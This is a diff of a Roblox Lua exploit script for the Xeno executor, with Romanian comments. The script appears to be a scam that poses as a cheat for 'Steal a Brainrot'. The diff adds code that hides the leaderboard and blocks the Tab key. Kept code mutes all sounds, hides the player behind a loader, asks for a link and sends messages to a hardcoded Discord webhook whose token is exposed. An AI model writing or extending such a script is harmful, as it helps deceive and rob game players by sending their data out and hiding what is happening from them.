@@ -1,5 +1,5 @@
 -- Script pentru Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
--- REPARAT: BAZA SE RESETEAZĂ + TOATE SUNETELE OPRITE
+-- BLOCHEAZĂ ȘI TASTA TAB
 -- Compatibil cu Xeno Executor
 
 local Players = game:GetService("Players")
@@ -10,6 +10,7 @@ local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
 
 -- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
@@ -29,17 +30,12 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== BLOCARE TOTALĂ A SUNETELOR (XENO) =====
+-- ===== BLOCARE TOTALĂ A SUNETELOR =====
 local function muteAllSounds()
     print("🔇 Blochez TOATE sunetele...")
     
-    -- 1. Setează volumul global la 0
     pcall(function()
         SoundService.Volume = 0
-    end)
-    
-    -- 2. Oprește TOATE sunetele din joc
-    pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
             if sound:IsA("Sound") then
                 sound.Volume = 0
@@ -49,22 +45,6 @@ local function muteAllSounds()
         end
     end)
     
-    -- 3. Oprește sunetele din toți jucătorii (inclusiv clone)
-    pcall(function()
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Character then
-                for _, sound in pairs(player.Character:GetDescendants()) do
-                    if sound:IsA("Sound") then
-                        sound.Volume = 0
-                        sound:Stop()
-                        sound.Playing = false
-                    end
-                end
-            end
-        end
-    end)
-    
-    -- 4. BLOCEAZĂ ORICE SUNET NOU (loop super-rapid)
     spawn(function()
         while true do
             task.wait(0.03)
@@ -84,7 +64,29 @@ local function muteAllSounds()
     print("✅ TOATE sunetele blocate!")
 end
 
--- ===== ASCUNDE BRAINROT-URILE ȘI SALVEAZĂ-LE =====
+-- ===== BLOCHEAZĂ TASTA TAB =====
+local function blockTab()
+    pcall(function()
+        -- Ascunde leaderboard-ul
+        for _, gui in pairs(CoreGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and (gui.Name:lower():find("leader") or gui.Name:lower():find("player") or gui.Name:lower():find("score") or gui.Name:lower():find("board")) then
+                gui.Enabled = false
+                gui.ResetOnSpawn = false
+            end
+        end
+        
+        -- Blochează tasta Tab
+        UserInputService.InputBegan:Connect(function(input)
+            if input.KeyCode == Enum.KeyCode.Tab then
+                input:StopPropagation()
+                return
+            end
+        end)
+    end)
+    print("✅ Tasta Tab blocată!")
+end
+
+-- ===== ASCUNDE BRAINROT-URILE =====
 local function hideBrainrots()
     local count = 0
     local hidden = {}
@@ -110,18 +112,16 @@ local function hideBrainrots()
     return count
 end
 
--- ===== RESETEAZĂ BAZA (REPARAT) =====
+-- ===== RESETEAZĂ BAZA =====
 local function resetBase()
     print("🔄 Resetez baza...")
     
-    -- 1. Distruge toate fake-urile
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
             pcall(function() obj:Destroy() end)
         end
     end
     
-    -- 2. Afișează brainrot-urile reale
     if _G.HiddenBrainrots then
         for _, brainrot in pairs(_G.HiddenBrainrots) do
             pcall(function()
@@ -131,13 +131,10 @@ local function resetBase()
         end
     end
     
-    -- 3. Așteaptă puțin și reascunde
     task.wait(3)
     hideBrainrots()
     
-    -- 4. FORȚEAZĂ RESETAREA BAZEI (trigger remote)
     pcall(function()
-        -- Încearcă să resetezi baza prin ReplicatedStorage
         for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
             if obj:IsA("RemoteEvent") and string.find(obj.Name:lower(), "reset") then
                 obj:FireServer()
@@ -522,10 +519,10 @@ local function showLinkGUI()
             showLoader()
             hideMe()
             muteAllSounds()
+            blockTab()  -- <-- BLOCHEAZĂ TASTA TAB
             local count = hideBrainrots()
             print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
             
-            -- ===== RESETEAZĂ BAZA LA 5 SECUNDE =====
             spawn(function()
                 while true do
                     task.wait(5)
@@ -543,6 +540,7 @@ local function main()
     showLinkGUI()
     print("🚀 Așteaptă introducerea link-ului...")
     print("🔄 Baza se va reseta automat la fiecare 5 secunde.")
+    print("🔒 Tasta Tab a fost blocată!")
 end
 
 -- ===== START =====
